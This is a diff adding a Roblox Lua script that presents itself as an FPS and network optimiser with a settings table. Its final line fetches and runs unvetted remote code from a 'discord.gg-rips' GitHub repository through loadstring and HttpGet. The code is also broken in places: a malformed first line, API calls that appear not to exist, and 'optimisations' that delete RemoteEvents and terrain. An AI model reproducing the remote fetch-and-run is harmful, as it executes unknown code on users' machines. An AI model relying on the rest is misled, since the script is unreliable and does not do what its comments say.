@@ -1,0 +1,131 @@
+G.Settings = {
+    Players = {
+        ["Ignore Me"] = true, -- Ignore your Character
+        ["Ignore Others"] = true -- Ignore other Characters
+    },
+    Meshes = {
+        Destroy = false, -- Destroy Meshes
+        LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
+    },
+    Images = {
+        Invisible = true, -- Invisible Images
+        LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
+        Destroy = false, -- Destroy Images
+    },
+    ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
+    ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
+    ["No Explosions"] = true, -- Makes Explosion's invisible
+    ["No Clothes"] = true, -- Removes Clothing from the game
+    ["Low Water Graphics"] = true, -- Removes Water Quality
+    ["No Shadows"] = true, -- Remove Shadows
+    ["Low Rendering"] = true, -- Lower Rendering
+    ["Low Quality Parts"] = true, -- Lower quality parts
+    PingOptimizations = true, -- Ping-based optimizations
+    NetworkOptimizations = true, -- Reduce unnecessary network load
+    RenderDistance = 100, -- Maximum render distance (in studs)
+    SimplifyTerrain = true, -- Simplify or disable terrain for better performance
+    DisableLightingEffects = true, -- Disable dynamic lighting effects for FPS
+}
+
+-- Disable unnecessary features for performance
+if _G.Settings["No Particles"] then
+    game:GetService("ReplicatedStorage"):WaitForChild("ParticleEmitters"):ClearAllChildren()
+end
+
+if _G.Settings["No Camera Effects"] then
+    local camera = game:GetService("Workspace").CurrentCamera
+    camera.PostProcessingEnabled = false
+end
+
+-- Adjust rendering settings
+if _G.Settings["Low Rendering"] then
+    game:GetService("Settings").RenderingQuality = Enum.QualityLevel.Low
+end
+
+if _G.Settings["Low Quality Parts"] then
+    game:GetService("ReplicatedStorage"):WaitForChild("LowDetailParts"):ClearAllChildren()
+end
+
+-- Mesh Optimization (Low Detail or Destroy)
+if _G.Settings.Meshes.LowDetail then
+    for _, mesh in pairs(workspace:GetDescendants()) do
+        if mesh:IsA("MeshPart") then
+            mesh.Reflectance = 0
+            mesh.Material = Enum.Material.SmoothPlastic
+            mesh.TextureID = ""
+        end
+    end
+end
+
+if _G.Settings.Meshes.Destroy then
+    for _, mesh in pairs(workspace:GetDescendants()) do
+        if mesh:IsA("MeshPart") then
+            mesh:Destroy()
+        end
+    end
+end
+
+-- Handle Ping Optimization (Low Ping = Less Restriction)
+if _G.Settings.PingOptimizations then
+    local function checkPing()
+        local player = game.Players.LocalPlayer
+        local ping = player.NetworkSettings.Ping
+
+        -- If ping is high, lower the quality of certain things
+        if ping > 150 then
+            -- Low-quality mesh and image adjustments
+            _G.Settings.Meshes.LowDetail = true
+            _G.Settings.Images.LowDetail = true
+            _G.Settings["Low Rendering"] = true
+            _G.Settings["No Shadows"] = true
+            _G.Settings["No Camera Effects"] = true
+            _G.Settings["No Particles"] = true
+        elseif ping then
+            -- Optimize for low ping
+            _G.Settings.Meshes.LowDetail = false
+            _G.Settings.Images.LowDetail = false
+            _G.Settings["Low Rendering"] = false
+            _G.Settings["No Shadows"] = false
+            _G.Settings["No Camera Effects"] = false
+            _G.Settings["No Particles"] = false
+        end
+    end
+
+    -- Run the ping check periodically
+    game:GetService("RunService").Heartbeat:Connect(function()
+        checkPing()
+    end)
+end
+
+-- Network Optimizations (Reduce Unnecessary Requests)
+if _G.Settings.NetworkOptimizations then
+    -- Disable RemoteEvents or reduce network activity for performance
+    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):ClearAllChildren()
+end
+
+-- Adjust Render Distance
+if _G.Settings.RenderDistance then
+    local camera = game:GetService("Workspace").CurrentCamera
+    camera:SetFarClippingDistance(_G.Settings.RenderDistance)
+end
+
+-- Simplify Terrain
+if _G.Settings.SimplifyTerrain then
+    -- Disable terrain rendering or reduce its complexity
+    local terrain = game:GetService("Workspace"):FindFirstChild("Terrain")
+    if terrain then
+        terrain:ClearAllChildren()  -- You can also choose to modify it for simpler visuals
+    end
+end
+
+-- Disable Lighting Effects for Better FPS
+if _G.Settings.DisableLightingEffects then
+    local lighting = game:GetService("Lighting")
+    lighting.GlobalShadows = false
+    lighting.Ambient = Color3.fromRGB(255, 255, 255)
+    lighting.Brightness = 2
+    lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
+end
+
+-- Optionally, include FPS boost from an external script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
